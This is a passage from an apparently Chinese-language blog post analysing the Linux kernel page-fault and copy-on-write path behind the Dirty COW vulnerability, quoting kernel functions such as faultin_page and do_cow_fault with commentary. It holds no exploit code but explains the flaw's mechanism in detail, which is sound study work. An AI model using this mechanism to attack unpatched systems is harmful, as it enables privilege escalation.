class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> no_page_table(vma, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page"></a>faultin_page</h5><p>回到__get_user_pages()函数，由于页表获取失败，调用<code>faultin_page</code>函数来创建页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages()-&gt;faultin_page()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">	...</span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);			<span class="comment">// 处理page fault，这里由于虚拟内存未映射page导致缺页中断</span></span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * VM_FAULT_WRITE 位告诉我们 do_wp_page 在必要时破坏了 COW，即使 Maybe_mkwrite 决定不设置 pte_write。因此，我们可以安全地进行后续页面查找，就好像它们被读取一样。</span></span><br><span class="line"><span class="comment">	 但是只有在循环 pte_write 是徒劳的情况下才这样做：在某些情况下，用户空间可能还想写入获取的用户页面，这里的读取错误可能会阻止（只读页面可能会被用户空间写入 reCOWed）。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>当页表为空时，调用do_fault来创建页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,				<span class="comment">// 当页表为空时，调用do_fault来申请页</span></span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h5><p>do_fault()函数里面有两个重要的判断条件：一个是 FAULT_FLAG_WRITE，另外一个是 VM_SHARED。我们的场景是触发了一个写错误的缺页中断，该页对应的 VMA 是私有映射即 VMA 的属性 vma-&gt;vm_flags 没设置 VM_SHARED，见 dirtycow 程序中使用 MAP_PRIVATE 的映射属性，因此跳转到 do_cow_fault 函数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用：  handle_pte_fault() -&gt; do_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))				<span class="comment">// FAULT_FLAG_WRITE 在上面的 faultin_page 函数中已经被置位了，代表的含义为是否是写错误，很显然这里是写错误，所以不进入该分支。do_read_fault直接映射page cache。</span></span><br><span class="line">                <span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">                                orig_pte);</span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))		<span class="comment">// 是否为非共享映射，也就是私有映射，这里是私有映射，进入该分支</span></span><br><span class="line">                <span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">                                orig_pte);</span><br><span class="line">        <span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);			<span class="comment">// 否则为共享映射</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="do-cow-fault"><a href="#do-cow-fault" class="headerlink" title="do_cow_fault"></a>do_cow_fault</h5><p>do_cow_fault()会重新分配一个新的页面 new_page，并且调用__do_fault()函数通过文件系 统相关的 API 把 page cache 读到 fault_page 中，然后把文件内容拷贝到新页面 new_page 里。 do_set_pte()函数会使用新页面和虚拟地址重新建立映射关系，最后把 fault_page 释放了。注意 这里 fault_page 是 page cache，new_page 可是匿名页面了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： do_fault() -&gt; do_cow_fault()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);			<span class="comment">//执行COW， 并更新页表为COW后的页表</span></span><br><span class="line">	...</span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);				<span class="comment">// 将page cache读入fault_page。</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma);							<span class="comment">// 将文件内容拷贝到new_page中，也就是COW复制出来的page。</span></span><br><span class="line">	...</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);										<span class="comment">// 将new_page与虚拟地址重新建立映射关系，之后释放fault_page。这里的fault_page为page cache。</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="do-set-pte"><a href="#do-set-pte" class="headerlink" title="do_set_pte"></a>do_set_pte</h5><p>这里利用刚才新分配的页面和 vma 相关属性来生成一个新的页表项 pte entry。 </p>
<p>由于是写错误的缺页中断，这里的write为1，page为dirty，所以将pte的dirty位置为1，这里我们要关心maybe代表了什么含义，pte 的 write 比特位为什么不确定呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： do_cow_fault() -&gt; do_set_pte()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_set_pte</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct page *page, <span class="keyword">pte_t</span> *pte, <span class="keyword">bool</span> write, <span class="keyword">bool</span> anon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">    </span><br><span class="line">	flush_icache_page(vma, page);</span><br><span class="line">	entry = mk_pte(page, vma-&gt;vm_page_prot);				<span class="comment">// 利用刚才新分配的页面和 vma 相关属性来生成一个新的页表项 pte entry。</span></span><br><span class="line">	<span class="keyword">if</span> (write)																			<span class="comment">// 这里的write为1，page为dirty，所以将pte的dirty位置为1，这里我们要关心maybe代表了什么含义，pte 的 write 比特位为什么不确定呢？</span></span><br><span class="line">		entry = maybe_mkwrite(pte_mkdirty(entry), vma);		</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="maybe-mkwrite"><a href="#maybe-mkwrite" class="headerlink" title="maybe_mkwrite"></a>maybe_mkwrite</h5><p>注释给了我们答案：pte entry 中的 WRITE 比特位是否需要置位还需要考虑 VMA 的 vm_flags 属性是否具有可写的属性，如果有可写属性才能设置 pte entry 中的 WRITE 比特位。我们这里的场景是 mmap 通过 只读方式（PROT_READ）映射一个文件，vma-&gt;vm_flags 是没有设置 VM_WRITE 这个属性。因此 新页面 new_page 和虚拟地址建立的新的 pte entry 是：dirty 的并且只读的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： do_set_pte() -&gt; maybe_mkwrite()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do pte_mkwrite, but only if the vma says VM_WRITE.  We do this when</span></span><br><span class="line"><span class="comment"> * servicing faults for write access.  In the normal case, do always want</span></span><br><span class="line"><span class="comment"> * pte_mkwrite.  But get_user_pages can cause write faults for mappings</span></span><br><span class="line"><span class="comment"> * that do not have writing enabled, when used by access_process_vm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">pte_t</span> <span class="title">maybe_mkwrite</span><span class="params">(<span class="keyword">pte_t</span> pte, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		pte = pte_mkwrite(pte);</span><br><span class="line">	<span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>梳理一下函数调用（通过缩进来区分函数调用关系）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mem_write</span><br><span class="line">	mem_rw</span><br><span class="line">		access_remote_vm</span><br><span class="line">			__access_remote_vm</span><br><span class="line">    			get_user_pages</span><br><span class="line">     				__get_user_pages_locked</span><br><span class="line">      					__get_user_pages</span><br><span class="line">       						follow_page_mask</span><br><span class="line">        						follow_page_pte</span><br><span class="line">       						faultin_page</span><br><span class="line">						        handle_mm_fault</span><br><span class="line">						         	__handle_mm_fault</span><br><span class="line">						          		handle_pte_fault</span><br><span class="line">						           			do_fault</span><br><span class="line">						           				do_cow_fault</span><br><span class="line">						             				do_set_pte</span><br><span class="line">						              					maybe_mkwrite</span><br></pre></td></tr></table></figure>

<p>通过上面的解释，很清楚的了解到，第一次write虽然文件内容已经映射到page cache上面，但是进程的页表还没有建立。当尝试访问该页时，发现页表项位空，从而触发了一个页错误。由于文件的属性位只读且私有映射，所以对其写入会触发COW。分配了一块新的page来建立页表项。</p>
<h4 id="（2）第二次write"><a href="#（2）第二次write" class="headerlink" title="（2）第二次write"></a>（2）第二次write</h4><p><strong>get_user_pages</strong>会第二次被调用会寻找页表项，<strong>follow_page_mask</strong>会调用<strong>follow_page_pte</strong>函数，这个函数会通过flag参数的<strong>FOLL_WRITE</strong>位是否为1判断要是否需要该页具有写权限，以及通过页表项的<strong>VM_WRITE</strong>位是否为1来判断该页是否可写。由于Mappedmem是以<strong>PROT_READ</strong>和<strong>MAP_PRIVATE</strong>的的形式进行映射的。所以<strong>VM_WRITE</strong>为0，又因为我们要求页表项要具有写权限，所以<strong>FOLL_WRITE</strong>为1，从而导致这次寻页会再次触发一个pagefault，<strong>faultin_page</strong>会再次调用<strong>handle_mm_fault</strong>进行处理。</p>
<h5 id="follow-page-pte-1"><a href="#follow-page-pte-1" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h5><p>当再次执行到follow_page_pte函数时，该 pte entry 的属性是：PRESENT 位被置位，Dirty 位被置位，只读位 RDONLY 也被置位了。因此当判断到传递进来的 flags 标志是可写的，但是实际 pte entry 只是可读属性，那么这里就不会返回正确的 page 结构了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages() -&gt; follow_page_mask -&gt; follow_page_pte()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">follow_page_pte</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(pte)) &#123;						</span><br><span class="line">              ...</span><br><span class="line">                <span class="keyword">if</span> (pte_none(pte))									</span><br><span class="line">                        <span class="keyword">goto</span> no_page;</span><br><span class="line">				...</span><br><span class="line">        <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;				<span class="comment">// 由于pte entry 不可写，所以走入该分支</span></span><br><span class="line">                pte_unmap_unlock(ptep, ptl);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">out:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">no_page:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> no_page_table(vma, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="handle-pte-fault-1"><a href="#handle-pte-fault-1" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>上面 follow_page_pte()返回为 NULL，所以这次为写错误的缺页中断，进入 faultin_page()。之后经过faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()的函数调用到达了handle_pte_fault函数。</p>
<p>因为这时 pte entry 的状态为：PRESENT =1、DIRTY=1、RDONLY=1，再加上写错误异常，因此根据 handle_pte_fault()函数的判断逻辑跳转到 do_wp_page()函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;										<span class="comment">// 这里的PRESENT 标志位为1，所以不走这个分支。</span></span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,				</span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;						<span class="comment">// 由于写错误，走入了该分支</span></span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))									</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,			<span class="comment">// 执行do_wp_page函数去处理</span></span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="wp-page-reuse"><a href="#wp-page-reuse" class="headerlink" title="wp_page_reuse"></a>wp_page_reuse</h5><p>上面调用 do_wp_page() 函数后经过一系列判断后交由 wp_page_reuse() 函数处理。这里依然调用 maybe_mkwrite()尝试置位 pte entry 中 WRITE 比特位，但是因为我们这个 vma 是只读映射的，因此这个尝试没法得逞。pte entry 依然是 RDONLY 和 DIRTY 的。注意这里返回的值是 VM_FAULT_WRITE（很关键）。<strong>VM_FAULT_WRITE</strong> 在下面的函数中解释。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： handle_pte_fault() -&gt; do_wp_page() -&gt; wp_page_reuse()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">wp_page_reuse</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">pte_t</span> *page_table, <span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page, <span class="keyword">int</span> page_mkwrite,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> dirty_shared)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> VM_FAULT_WRITE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="faultin-page-1"><a href="#faultin-page-1" class="headerlink" title="faultin_page"></a>faultin_page</h5><p>回到faultin_page函数，由于handle_mm_fault()返回了 VM_FAULT_WRITE，在代码中判断如果ret中VM_FAULT_WRITE被置位且VMA不可写的情况下清除flag的FOLL_WRITE标记。</p>
<p>VM_FAULT_WRITE表示我们尝试写入了old_page但old_page是只读的。同时也表示我们完成了COW的步骤，通过将vma的FOLL_WRITE标志取消，表示我们对new_page的读写将<strong>没有限制</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时<code>faultin_page</code>函数返回0。回到__get_user_pages函数。</p>
<h5 id="get-user-pages-1"><a href="#get-user-pages-1" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>调用follow_page_mask 函数，此时foll_flags中的 FOLL_WRITE 标志位0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();</span><br><span class="line">                page = follow_page_mask(vma, start, 